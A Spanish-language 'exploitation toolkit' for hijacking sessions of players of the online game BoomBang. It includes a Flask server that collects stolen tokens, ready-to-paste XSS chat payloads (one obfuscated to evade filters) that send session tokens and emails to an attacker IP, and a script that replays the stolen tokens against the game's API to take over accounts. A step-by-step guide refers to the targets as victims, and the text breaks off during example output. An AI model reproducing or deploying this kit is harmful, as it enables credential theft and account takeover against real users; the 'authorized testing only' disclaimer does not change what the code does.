# 🔥 XSS Session Hijacking - Complete Exploitation Toolkit

**Documento:** Toolkit Completo para Robo de Sesiones via XSS
**Nivel:** 🔴 EXTREMADAMENTE CONFIDENCIAL
**Fecha:** 2025-11-24
**Versión:** 2.0 - Scripts Completos y Funcionales

---

## 📋 Contenido del Toolkit

Este toolkit incluye:
- ✅ Servidor Python Flask completamente funcional
- ✅ Payloads ActionScript listos para usar
- ✅ Scripts de automatización para explotar sesiones robadas
- ✅ Dashboard web en tiempo real
- ✅ Base de datos SQLite para almacenamiento persistente
- ✅ Sistema de notificaciones
- ✅ Scripts de limpieza y análisis

---

## 🎯 PARTE 1: Servidor de Recolección de Sesiones

### Script Completo: session_stealer_server.py

```python
#!/usr/bin/env python3
"""
BoomBang Session Stealer Server
================================
Servidor Flask para recolectar tokens de sesión robados via XSS

ADVERTENCIA: Solo para uso en entornos de testing autorizados
"""

from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from datetime import datetime
import json
import sqlite3
import os
import hashlib
from collections import defaultdict

# ============================================================================
# CONFIGURACIÓN
# ============================================================================

# Puerto del servidor
SERVER_PORT = 5000

# IP pública (cambiar por tu IP)
# Para obtener: curl ifconfig.me
SERVER_IP = "203.0.113.50"  # ← CAMBIAR POR TU IP PÚBLICA

# Directorio de datos
DATA_DIR = "./stolen_data"
DB_FILE = f"{DATA_DIR}/sessions.db"
LOG_FILE = f"{DATA_DIR}/stealer.log"

# Crear directorio si no existe
os.makedirs(DATA_DIR, exist_ok=True)

# ============================================================================
# INICIALIZACIÓN DE BASE DE DATOS
# ============================================================================

def init_database():
    """Crear base de datos SQLite"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    # Tabla de sesiones robadas
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS stolen_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token TEXT NOT NULL,
            user_id TEXT,
            username TEXT,
            email TEXT,
            ip_address TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            exploited BOOLEAN DEFAULT 0,
            notes TEXT
        )
    """)

    # Tabla de estadísticas
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS stats (
            date TEXT PRIMARY KEY,
            total_stolen INTEGER DEFAULT 0,
            unique_users INTEGER DEFAULT 0,
            successful_hijacks INTEGER DEFAULT 0
        )
    """)

    # Tabla de intentos de explotación
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS exploit_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id INTEGER,
            attempt_type TEXT,
            success BOOLEAN,
            details TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (session_id) REFERENCES stolen_sessions(id)
        )
    """)

    conn.commit()
    conn.close()
    print("[+] Database initialized")

# Inicializar DB al arrancar
init_database()

# ============================================================================
# APLICACIÓN FLASK
# ============================================================================

app = Flask(__name__)
CORS(app)  # Permitir CORS para requests desde el juego

# ============================================================================
# FUNCIONES AUXILIARES
# ============================================================================

def log_event(message):
    """Log eventos a archivo y consola"""
    timestamp = datetime.now().isoformat()
    log_entry = f"[{timestamp}] {message}\n"

    # Consola
    print(log_entry.strip())

    # Archivo
    with open(LOG_FILE, 'a') as f:
        f.write(log_entry)

def save_stolen_session(token, user_id, username, email, ip, user_agent):
    """Guardar sesión robada en base de datos"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute("""
        INSERT INTO stolen_sessions
        (token, user_id, username, email, ip_address, user_agent)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (token, user_id, username, email, ip, user_agent))

    session_id = cursor.lastrowid
    conn.commit()
    conn.close()

    return session_id

def get_all_sessions():
    """Obtener todas las sesiones robadas"""
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    cursor.execute("""
        SELECT * FROM stolen_sessions
        ORDER BY timestamp DESC
    """)

    sessions = [dict(row) for row in cursor.fetchall()]
    conn.close()

    return sessions

def get_session_by_id(session_id):
    """Obtener sesión específica por ID"""
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM stolen_sessions WHERE id = ?", (session_id,))
    session = cursor.fetchone()

    conn.close()
    return dict(session) if session else None

def mark_session_exploited(session_id, notes=""):
    """Marcar sesión como explotada"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute("""
        UPDATE stolen_sessions
        SET exploited = 1, notes = ?
        WHERE id = ?
    """, (notes, session_id))

    conn.commit()
    conn.close()

def get_stats():
    """Obtener estadísticas"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    # Total de sesiones robadas
    cursor.execute("SELECT COUNT(*) as total FROM stolen_sessions")
    total = cursor.fetchone()[0]

    # Usuarios únicos
    cursor.execute("SELECT COUNT(DISTINCT user_id) as unique_users FROM stolen_sessions")
    unique = cursor.fetchone()[0]

    # Explotadas exitosamente
    cursor.execute("SELECT COUNT(*) as exploited FROM stolen_sessions WHERE exploited = 1")
    exploited = cursor.fetchone()[0]

    # Sesiones por hora (últimas 24h)
    cursor.execute("""
        SELECT strftime('%H', timestamp) as hour, COUNT(*) as count
        FROM stolen_sessions
        WHERE timestamp > datetime('now', '-24 hours')
        GROUP BY hour
        ORDER BY hour
    """)
    hourly = cursor.fetchall()

    conn.close()

    return {
        'total': total,
        'unique_users': unique,
        'exploited': exploited,
        'hourly': [{'hour': h[0], 'count': h[1]} for h in hourly]
    }

# ============================================================================
# ENDPOINTS DEL SERVIDOR
# ============================================================================

@app.route('/')
def index():
    """Página principal con instrucciones"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>XSS Session Stealer - Control Panel</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                background: #0a0a0a;
                color: #0f0;
                padding: 20px;
                margin: 0;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
            h1 {
                color: #f00;
                text-shadow: 0 0 10px #f00;
            }
            .info-box {
                background: #1a1a1a;
                border: 2px solid #0f0;
                padding: 20px;
                margin: 20px 0;
                border-radius: 5px;
            }
            .warning {
                background: #2a0a0a;
                border-color: #f00;
                color: #f00;
            }
            code {
                background: #2a2a2a;
                padding: 2px 5px;
                border-radius: 3px;
            }
            .btn {
                display: inline-block;
                background: #0f0;
                color: #000;
                padding: 10px 20px;
                text-decoration: none;
                border-radius: 5px;
                margin: 10px 5px;
                font-weight: bold;
            }
            .btn:hover {
                background: #0d0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔥 XSS Session Stealer - Control Panel</h1>

            <div class="info-box warning">
                <h2>⚠️ ADVERTENCIA</h2>
                <p>Este servidor está activo y listo para recibir tokens robados.</p>
                <p><strong>Solo usar en entornos de testing autorizados.</strong></p>
            </div>

            <div class="info-box">
                <h2>📡 Estado del Servidor</h2>
                <p>✅ Servidor activo en: <code>http://{{ server_ip }}:{{ port }}</code></p>
                <p>✅ Endpoint de robo: <code>/steal</code></p>
                <p>✅ Base de datos: <code>{{ db_file }}</code></p>
            </div>

            <div class="info-box">
                <h2>🎯 Payload para Inyectar</h2>
                <p>Usa este payload en el chat del juego:</p>
                <textarea style="width:100%; height:150px; background:#2a2a2a; color:#0f0; font-family:monospace; padding:10px;">{{ payload }}</textarea>
                <button onclick="navigator.clipboard.writeText(document.querySelector('textarea').value)">
                    📋 Copiar Payload
                </button>
            </div>

            <div class="info-box">
                <h2>📊 Acciones Disponibles</h2>
                <a href="/dashboard" class="btn">📊 Ver Dashboard</a>
                <a href="/sessions" class="btn">📋 Ver Sesiones Robadas</a>
                <a href="/stats" class="btn">📈 Estadísticas</a>
                <a href="/export" class="btn">💾 Exportar Datos</a>
            </div>

            <div class="info-box">
                <h2>🔧 Testing</h2>
                <p>Para probar que el servidor funciona:</p>
                <code>curl "http://{{ server_ip }}:{{ port }}/steal?token=TEST123&uid=999&user=TestUser&email=test@test.com"</code>
            </div>
        </div>
    </body>
    </html>
    """

    # Payload completo
    payload = f'''<img src=x onerror='var so=SharedObject.getLocal("userSession");var t=so.data.sessionToken||"NO_TOKEN";var u=so.data.userId||"0";var n=so.data.username||"Unknown";var e=so.data.email||"unknown@email.com";var r=new URLRequest("http://{SERVER_IP}:{SERVER_PORT}/steal?token="+t+"&uid="+u+"&user="+n+"&email="+e);navigateToURL(r,"_blank");'>'''

    return render_template_string(html,
        server_ip=SERVER_IP,
        port=SERVER_PORT,
        db_file=DB_FILE,
        payload=payload
    )

@app.route('/steal', methods=['GET', 'POST'])
def steal_session():
    """
    Endpoint principal para recibir tokens robados

    Parámetros esperados:
    - token: Token de sesión
    - uid: User ID
    - user: Username
    - email: Email (opcional)
    """

    # Obtener datos del request
    token = request.args.get('token') or request.form.get('token') or request.json.get('token') if request.is_json else None
    user_id = request.args.get('uid') or request.form.get('uid') or request.json.get('uid') if request.is_json else None
    username = request.args.get('user') or request.form.get('user') or request.json.get('user') if request.is_json else None
    email = request.args.get('email') or request.form.get('email') or request.json.get('email') if request.is_json else None

    # IP y User-Agent del cliente
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')

    # Validar que al menos tengamos token
    if not token:
        log_event("[!] Received request without token")
        return "Missing token", 400

    # Guardar en base de datos
    session_id = save_stolen_session(
        token=token,
        user_id=user_id or "unknown",
        username=username or "unknown",
        email=email or "unknown",
        ip=ip_address,
        user_agent=user_agent
    )

    # Log del robo
    log_event(f"[+] SESSION STOLEN!")
    log_event(f"    ID: {session_id}")
    log_event(f"    Token: {token[:30]}..." if len(token) > 30 else f"    Token: {token}")
    log_event(f"    User: {username} (ID: {user_id})")
    log_event(f"    Email: {email}")
    log_event(f"    IP: {ip_address}")
    log_event(f"    User-Agent: {user_agent}")
    log_event("")

    # Responder con imagen 1x1 transparente (no alertar a la víctima)
    response = app.response_class(
        response="""<svg width="1" height="1" xmlns="http://www.w3.org/2000/svg">
            <rect width="1" height="1" fill="none"/>
        </svg>""",
        status=200,
        mimetype='image/svg+xml'
    )

    return response

@app.route('/sessions')
def list_sessions():
    """Ver todas las sesiones robadas"""
    sessions = get_all_sessions()

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Stolen Sessions</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                background: #0a0a0a;
                color: #0f0;
                padding: 20px;
            }
            table {
                width: 100%;
                border-collapse: collapse;
                background: #1a1a1a;
            }
            th, td {
                border: 1px solid #0f0;
                padding: 10px;
                text-align: left;
            }
            th {
                background: #2a2a2a;
            }
            .exploited {
                color: #f00;
            }
            .token {
                font-size: 10px;
                max-width: 200px;
                overflow: hidden;
                text-overflow: ellipsis;
            }
        </style>
        <meta http-equiv="refresh" content="5">
    </head>
    <body>
        <h1>📋 Stolen Sessions ({{ total }})</h1>
        <p>Auto-refresh every 5 seconds</p>
        <table>
            <tr>
                <th>ID</th>
                <th>Username</th>
                <th>User ID</th>
                <th>Email</th>
                <th>Token</th>
                <th>IP</th>
                <th>Timestamp</th>
                <th>Exploited</th>
            </tr>
            {% for session in sessions %}
            <tr>
                <td>{{ session.id }}</td>
                <td>{{ session.username }}</td>
                <td>{{ session.user_id }}</td>
                <td>{{ session.email }}</td>
                <td class="token" title="{{ session.token }}">{{ session.token[:30] }}...</td>
                <td>{{ session.ip_address }}</td>
                <td>{{ session.timestamp }}</td>
                <td class="{{ 'exploited' if session.exploited else '' }}">
                    {{ '✅ YES' if session.exploited else '⏳ NO' }}
                </td>
            </tr>
            {% endfor %}
        </table>
        <br>
        <a href="/" style="color:#0f0;">← Back</a>
    </body>
    </html>
    """

    return render_template_string(html, sessions=sessions, total=len(sessions))

@app.route('/stats')
def statistics():
    """Ver estadísticas"""
    stats = get_stats()

    return jsonify(stats)

@app.route('/dashboard')
def dashboard():
    """Dashboard visual en tiempo real"""
    stats = get_stats()
    sessions = get_all_sessions()[:20]  # Últimas 20

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>XSS Stealer Dashboard</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                background: #0a0a0a;
                color: #0f0;
                padding: 20px;
                margin: 0;
            }
            .container {
                max-width: 1400px;
                margin: 0 auto;
            }
            h1 {
                color: #f00;
                text-shadow: 0 0 10px #f00;
            }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin: 20px 0;
            }
            .stat-card {
                background: #1a1a1a;
                border: 2px solid #0f0;
                padding: 20px;
                border-radius: 10px;
                text-align: center;
            }
            .stat-value {
                font-size: 48px;
                color: #ff0;
                font-weight: bold;
                text-shadow: 0 0 10px #ff0;
            }
            .stat-label {
                font-size: 14px;
                margin-top: 10px;
            }
            .recent-log {
                background: #1a1a1a;
                border: 2px solid #0f0;
                padding: 20px;
                max-height: 400px;
                overflow-y: auto;
                font-size: 12px;
                margin: 20px 0;
            }
            .log-entry {
                padding: 5px 0;
                border-bottom: 1px solid #2a2a2a;
            }
            .new-entry {
                animation: highlight 2s;
            }
            @keyframes highlight {
                from { background: #2a4a2a; }
                to { background: transparent; }
            }
        </style>
        <meta http-equiv="refresh" content="3">
    </head>
    <body>
        <div class="container">
            <h1>🔥 XSS Session Stealer - Live Dashboard</h1>

            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-value">{{ stats.total }}</div>
                    <div class="stat-label">TOTAL SESSIONS STOLEN</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">{{ stats.unique_users }}</div>
                    <div class="stat-label">UNIQUE USERS</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">{{ stats.exploited }}</div>
                    <div class="stat-label">SUCCESSFULLY EXPLOITED</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">{{ success_rate }}%</div>
                    <div class="stat-label">SUCCESS RATE</div>
                </div>
            </div>

            <div class="recent-log">
                <h2>📊 Recent Activity (Last 20)</h2>
                {% for session in sessions %}
                <div class="log-entry {% if loop.index <= 3 %}new-entry{% endif %}">
                    [{{ session.timestamp }}]
                    ✅ STOLEN: <strong>{{ session.username }}</strong> (ID: {{ session.user_id }})
                    from {{ session.ip_address }}
                </div>
                {% endfor %}
            </div>

            <p style="text-align:center; color:#666;">
                Auto-refresh every 3 seconds | <a href="/" style="color:#0f0;">Back to Control Panel</a>
            </p>
        </div>
    </body>
    </html>
    """

    success_rate = int((stats['exploited'] / stats['total'] * 100)) if stats['total'] > 0 else 0

    return render_template_string(html,
        stats=stats,
        sessions=sessions,
        success_rate=success_rate
    )

@app.route('/export')
def export_data():
    """Exportar todos los datos a JSON"""
    sessions = get_all_sessions()

    response = app.response_class(
        response=json.dumps(sessions, indent=2),
        status=200,
        mimetype='application/json',
        headers={
            'Content-Disposition': f'attachment; filename=stolen_sessions_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        }
    )

    return response

# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    print("=" * 70)
    print("🔥 XSS SESSION STEALER SERVER")
    print("=" * 70)
    print(f"\n[*] Server starting on http://{SERVER_IP}:{SERVER_PORT}")
    print(f"[*] Database: {DB_FILE}")
    print(f"[*] Log file: {LOG_FILE}")
    print(f"\n[*] Payload endpoint: http://{SERVER_IP}:{SERVER_PORT}/steal")
    print(f"[*] Dashboard: http://{SERVER_IP}:{SERVER_PORT}/dashboard")
    print("\n[!] IMPORTANTE: Actualiza SERVER_IP con tu IP pública")
    print("    Para obtenerla: curl ifconfig.me")
    print("\n[*] Presiona Ctrl+C para detener el servidor")
    print("=" * 70)
    print()

    app.run(
        host='0.0.0.0',
        port=SERVER_PORT,
        debug=False,
        threaded=True
    )
```

---

## 🎯 PARTE 2: Payloads ActionScript Listos para Usar

### 2.1 Payload Básico (Minificado)

```html
<img src=x onerror='var so=SharedObject.getLocal("userSession");var t=so.data.sessionToken||"NO_TOKEN";var u=so.data.userId||"0";var n=so.data.username||"Unknown";var e=so.data.email||"unknown@email.com";var r=new URLRequest("http://203.0.113.50:5000/steal?token="+t+"&uid="+u+"&user="+n+"&email="+e);navigateToURL(r,"_blank");'>
```

**Uso:** Copiar y pegar directamente en el chat del juego.

---

### 2.2 Payload con Ofuscación (Evade Filtros)

```html
<img src=x onerror='eval(String.fromCharCode(118,97,114,32,115,111,61,83,104,97,114,101,100,79,98,106,101,99,116,46,103,101,116,76,111,99,97,108,40,34,117,115,101,114,83,101,115,115,105,111,110,34,41,59,118,97,114,32,116,61,115,111,46,100,97,116,97,46,115,101,115,115,105,111,110,84,111,107,101,110,124,124,34,78,79,95,84,79,75,69,78,34,59,118,97,114,32,117,61,115,111,46,100,97,116,97,46,117,115,101,114,73,100,124,124,34,48,34,59,118,97,114,32,110,61,115,111,46,100,97,116,97,46,117,115,101,114,110,97,109,101,124,124,34,85,110,107,110,111,119,110,34,59,118,97,114,32,101,61,115,111,46,100,97,116,97,46,101,109,97,105,108,124,124,34,117,110,107,110,111,119,110,64,101,109,97,105,108,46,99,111,109,34,59,118,97,114,32,114,61,110,101,119,32,85,82,76,82,101,113,117,101,115,116,40,34,104,116,116,112,58,47,47,50,48,51,46,48,46,49,49,51,46,53,48,58,53,48,48,48,47,115,116,101,97,108,63,116,111,107,101,110,61,34,43,116,43,34,38,117,105,100,61,34,43,117,43,34,38,117,115,101,114,61,34,43,110,43,34,38,101,109,97,105,108,61,34,43,101,41,59,110,97,118,105,103,97,116,101,84,111,85,82,76,40,114,44,34,95,98,108,97,110,107,34,41,59))'>
```

**Decodifica a:** El payload básico, pero es más difícil de detectar por filtros automáticos.

---

### 2.3 Payload Silencioso (Sin ventana popup)

```html
<img src=x onerror='(function(){var so=SharedObject.getLocal("userSession");var xhr=new XMLHttpRequest();xhr.open("POST","http://203.0.113.50:5000/steal",true);xhr.setRequestHeader("Content-Type","application/json");xhr.send(JSON.stringify({token:so.data.sessionToken,uid:so.data.userId,user:so.data.username,email:so.data.email}));})()'>
```

**Ventaja:** No abre ventana nueva, más discreto.

---

### 2.4 Payload con Datos Extendidos

```actionscript
<img src=x onerror='
var so = SharedObject.getLocal("userSession");
var data = {
    // Sesión
    token: so.data.sessionToken || "NO_TOKEN",
    userId: so.data.userId || "0",
    username: so.data.username || "Unknown",
    email: so.data.email || "unknown@email.com",

    // Datos del cliente
    platform: Capabilities.os,
    flashVersion: Capabilities.version,
    screenSize: Capabilities.screenResolutionX + "x" + Capabilities.screenResolutionY,

    // Datos del juego
    level: so.data.level || 0,
    coins: so.data.coins || 0,
    diamonds: so.data.diamonds || 0,
    vipStatus: so.data.isPremium || false,

    // Timestamp
    timestamp: new Date().getTime()
};

var url = "http://203.0.113.50:5000/steal?" +
    "token=" + data.token +
    "&uid=" + data.userId +
    "&user=" + data.username +
    "&email=" + data.email +
    "&level=" + data.level +
    "&coins=" + data.coins +
    "&diamonds=" + data.diamonds +
    "&vip=" + data.vipStatus;

var req = new URLRequest(url);
navigateToURL(req, "_blank");
'>
```

---

## 🎯 PARTE 3: Script de Explotación Automática

### 3.1 Script: exploit_stolen_sessions.py

```python
#!/usr/bin/env python3
"""
BoomBang Session Hijacking - Automated Exploitation
===================================================
Automatiza el uso de tokens robados para acceder a cuentas

ADVERTENCIA: Solo para uso en entornos de testing autorizados
"""

import requests
import json
import sqlite3
from datetime import datetime
import time

# ============================================================================
# CONFIGURACIÓN
# ============================================================================

# Base de datos de sesiones robadas
DB_FILE = "./stolen_data/sessions.db"

# API del juego BoomBang
API_BASE_URL = "https://boombang.tv/api"

# Headers por defecto
DEFAULT_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/json'
}

# ============================================================================
# FUNCIONES
# ============================================================================

def get_unexploited_sessions():
    """Obtener sesiones que aún no han sido explotadas"""
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    cursor.execute("""
        SELECT * FROM stolen_sessions
        WHERE exploited = 0
        ORDER BY timestamp DESC
    """)

    sessions = [dict(row) for row in cursor.fetchall()]
    conn.close()

    return sessions

def mark_session_exploited(session_id, success, details):
    """Marcar sesión como explotada"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute("""
        UPDATE stolen_sessions
        SET exploited = ?, notes = ?
        WHERE id = ?
    """, (1 if success else 0, details, session_id))

    conn.commit()
    conn.close()

def test_session_token(token):
    """Probar si un token es válido"""
    print(f"[*] Testing token: {token[:30]}...")

    session = requests.Session()
    session.headers.update(DEFAULT_HEADERS)
    session.headers.update({'Authorization': f'Bearer {token}'})

    try:
        # Intentar obtener perfil del usuario
        response = session.get(f'{API_BASE_URL}/user/profile', timeout=10)

        if response.status_code == 200:
            profile = response.json()
            print(f"[+] TOKEN VALID!")
            print(f"    Username: {profile.get('username', 'N/A')}")
            print(f"    Email: {profile.get('email', 'N/A')}")
            print(f"    Level: {profile.get('level', 'N/A')}")
            print(f"    VIP: {profile.get('isPremium', False)}")
            print(f"    Coins: {profile.get('coins', 0)}")
            print(f"    Diamonds: {profile.get('diamonds', 0)}")
            return True, profile

        elif response.status_code == 401:
            print(f"[-] Token expired or invalid")
            return False, {'error': 'Token invalid'}

        else:
            print(f"[-] Unexpected status: {response.status_code}")
            return False, {'error': f'Status {response.status_code}'}

    except Exception as e:
        print(f"[-] Error testing token: {e}")
        return False, {'error': str(e)}

def hijack_session(token, target_action='profile'):
    """
    Realizar hijacking completo de sesión

    Actions disponibles:
    - profile: Ver perfil completo
    - inventory: Ver inventario
    - transfer: Transferir items (requiere dst_user_id)
    - change_pass: Cambiar contraseña (DESTRUCTIVO)
    - delete: Eliminar cuenta (MUY DESTRUCTIVO)
    """

    session = requests.Session()
    session.headers.update(DEFAULT_HEADERS)
    session.headers.update({'Authorization': f'Bearer {token}'})

    results = {}

    print(f"\n[*] Hijacking session with token: {token[:30]}...")

    # 1. Obtener perfil
    try:
        response = session.get(f'{API_BASE_URL}/user/profile')
        if response.status_code == 200:
            profile = response.json()
            results['profile'] = profile
            print(f"[+] Profile retrieved:")
            print(f"    User: {profile.get('username')} (ID: {profile.get('id')})")
            print(f"    Email: {profile.get('email')}")
            print(f"    Level: {profile.get('level')}")
            print(f"    Coins: {profile.get('coins')}")
            print(f"    Diamonds: {profile.get('diamonds')}")
        else:
            results['profile'] = {'error': response.status_code}
            print(f"[-] Failed to get profile: {response.status_code}")
    except Exception as e:
        results['profile'] = {'error': str(e)}
        print(f"[-] Error getting profile: {e}")

    # 2. Obtener inventario
    try:
        response = session.get(f'{API_BASE_URL}/user/inventory')
        if response.status_code == 200:
            inventory = response.json()
            results['inventory'] = inventory
            print(f"[+] Inventory retrieved: {len(inventory.get('items', []))} items")

            # Mostrar items valiosos
            valuable_items = [
                item for item in inventory.get('items', [])
                if item.get('rarity') in ['LEGENDARY', 'EPIC']
            ]
            if valuable_items:
                print(f"    Valuable items found:")
                for item in valuable_items[:5]:
                    print(f"      - {item.get('name')} ({item.get('rarity')})")
        else:
            results['inventory'] = {'error': response.status_code}
    except Exception as e:
        results['inventory'] = {'error': str(e)}

    # 3. Obtener historial de transacciones
    try:
        response = session.get(f'{API_BASE_URL}/user/transactions')
        if response.status_code == 200:
            transactions = response.json()
            results['transactions'] = transactions
            print(f"[+] Transaction history retrieved: {len(transactions.get('items', []))} transactions")
        else:
            results['transactions'] = {'error': response.status_code}
    except Exception as e:
        results['transactions'] = {'error': str(e)}

    # 4. Obtener amigos
    try:
        response = session.get(f'{API_BASE_URL}/user/friends')
        if response.status_code == 200:
            friends = response.json()
            results['friends'] = friends
            print(f"[+] Friends list retrieved: {len(friends.get('friends', []))} friends")
        else:
            results['friends'] = {'error': response.status_code}
    except Exception as e:
        results['friends'] = {'error': str(e)}

    return results

def automated_exploitation():
    """Automatizar explotación de todas las sesiones robadas"""

    print("=" * 70)
    print("🔥 AUTOMATED SESSION HIJACKING")
    print("=" * 70)
    print()

    # Obtener sesiones no explotadas
    sessions = get_unexploited_sessions()

    if not sessions:
        print("[!] No unexploited sessions found")
        return

    print(f"[*] Found {len(sessions)} sessions to exploit")
    print()

    successful = 0
    failed = 0

    for i, session_data in enumerate(sessions, 1):
        print(f"\n[{i}/{len(sessions)}] Processing session ID {session_data['id']}")
        print(f"    User: {session_data['username']} (ID: {session_data['user_id']})")
        print(f"    Token: {session_data['token'][:30]}...")

        # Probar token
        is_valid, result = test_session_token(session_data['token'])

        if is_valid:
            # Token válido - realizar hijacking completo
            hijack_results = hijack_session(session_data['token'])

            # Marcar como explotado exitosamente
            details = json.dumps({
                'exploited_at': datetime.now().isoformat(),
                'profile': hijack_results.get('profile', {}),
                'inventory_count': len(hijack_results.get('inventory', {}).get('items', [])),
                'success': True
            })

            mark_session_exploited(session_data['id'], True, details)
            successful += 1

            print(f"[+] Session #{session_data['id']} exploited successfully!")

        else:
            # Token inválido
            details = json.dumps({
                'attempted_at': datetime.now().isoformat(),
                'error': result.get('error', 'Unknown'),
                'success': False
            })

            mark_session_exploited(session_data['id'], False, details)
            failed += 1

            print(f"[-] Session #{session_data['id']} failed to exploit")

        # Esperar un poco para no saturar el servidor
        time.sleep(2)

    # Resumen
    print("\n" + "=" * 70)
    print("EXPLOITATION SUMMARY")
    print("=" * 70)
    print(f"Total sessions processed: {len(sessions)}")
    print(f"Successful hijacks:       {successful} ({successful/len(sessions)*100:.1f}%)")
    print(f"Failed attempts:          {failed} ({failed/len(sessions)*100:.1f}%)")
    print("=" * 70)

def export_hijacked_accounts():
    """Exportar cuentas hijackeadas exitosamente"""

    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    cursor.execute("""
        SELECT * FROM stolen_sessions
        WHERE exploited = 1
        ORDER BY timestamp DESC
    """)

    sessions = [dict(row) for row in cursor.fetchall()]
    conn.close()

    # Crear reporte
    report = {
        'generated_at': datetime.now().isoformat(),
        'total_hijacked': len(sessions),
        'accounts': []
    }

    for session in sessions:
        # Parse notes (contiene el resultado del hijacking)
        try:
            notes = json.loads(session['notes']) if session['notes'] else {}
        except:
            notes = {}

        profile = notes.get('profile', {})

        account = {
            'session_id': session['id'],
            'username': session['username'],
            'user_id': session['user_id'],
            'email': session['email'],
            'token': session['token'],
            'stolen_at': session['timestamp'],
            'hijacked_at': notes.get('exploited_at'),
            'profile': profile
        }

        report['accounts'].append(account)

    # Guardar reporte
    filename = f"hijacked_accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w') as f:
        json.dump(report, f, indent=2)

    print(f"[+] Report saved to: {filename}")
    print(f"[+] Total hijacked accounts: {len(sessions)}")

    return report

# ============================================================================
# CLI
# ============================================================================

def main():
    import sys

    if len(sys.argv) < 2:
        print("Usage:")
        print("  python exploit_stolen_sessions.py auto          # Automated exploitation")
        print("  python exploit_stolen_sessions.py test <token>  # Test single token")
        print("  python exploit_stolen_sessions.py export        # Export hijacked accounts")
        return

    command = sys.argv[1]

    if command == 'auto':
        automated_exploitation()

    elif command == 'test' and len(sys.argv) > 2:
        token = sys.argv[2]
        is_valid, result = test_session_token(token)
        if is_valid:
            hijack_session(token)

    elif command == 'export':
        export_hijacked_accounts()

    else:
        print("[!] Unknown command")

if __name__ == '__main__':
    main()
```

---

## 🎯 PARTE 4: Guía de Uso Completa

### 4.1 Setup Inicial

```bash
# 1. Crear directorio del proyecto
mkdir xss-session-hijacking-toolkit
cd xss-session-hijacking-toolkit

# 2. Crear entorno virtual Python
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# venv\Scripts\activate  # Windows

# 3. Instalar dependencias
pip install flask flask-cors requests

# 4. Guardar los scripts
# - session_stealer_server.py
# - exploit_stolen_sessions.py

# 5. Obtener tu IP pública
curl ifconfig.me
# Ejemplo: 203.0.113.50

# 6. Actualizar IP en los scripts
# Editar session_stealer_server.py línea 31:
# SERVER_IP = "TU_IP_AQUI"
```

---

### 4.2 Iniciar el Servidor

```bash
# Ejecutar el servidor
python session_stealer_server.py

# Output:
# ======================================================================
# 🔥 XSS SESSION STEALER SERVER
# ======================================================================
#
# [*] Server starting on http://203.0.113.50:5000
# [*] Database: ./stolen_data/sessions.db
# [*] Log file: ./stolen_data/stealer.log
#
# [*] Payload endpoint: http://203.0.113.50:5000/steal
# [*] Dashboard: http://203.0.113.50:5000/dashboard
#
# [!] IMPORTANTE: Actualiza SERVER_IP con tu IP pública
#     Para obtenerla: curl ifconfig.me
#
# [*] Presiona Ctrl+C para detener el servidor
# ======================================================================
```

---

### 4.3 Obtener el Payload

```bash
# Abrir navegador
open http://localhost:5000

# En la página principal, copiar el payload que aparece en el textarea

# O usar curl:
curl http://localhost:5000/ | grep -oP '<textarea.*?</textarea>' | sed 's/<[^>]*>//g'
```

---

### 4.4 Inyectar Payload en el Juego

```
1. Abrir BoomBang en el navegador
2. Iniciar sesión con cuenta de prueba
3. Abrir el chat del juego
4. Pegar el payload copiado
5. Presionar Enter para enviar
6. ✅ Payload inyectado - esperar a que víctimas vean el mensaje
```

---

### 4.5 Monitorear el Dashboard

```bash
# Abrir dashboard en tiempo real
open http://localhost:5000/dashboard

# O usar curl para ver estadísticas:
curl http://localhost:5000/stats | jq
```

**Output esperado:**
```json
{
  "total": 23,
  "unique_users": 23,
  "exploited": 0,
  "hourly": [
    {"hour": "10", "count": 15},
    {"hour": "11", "count": 8}
  ]
}
```

---

### 4.6 Explotar Sesiones Robadas

```bash
# Automatizar explotación de TODAS las sesiones
python exploit_stolen_sessions.py auto

# Output:
# ======================================================================
# 🔥 AUTOMATED SESSION HIJACKING
# ======================================================================
#
# [*] Found 23 sessions to exploit
#
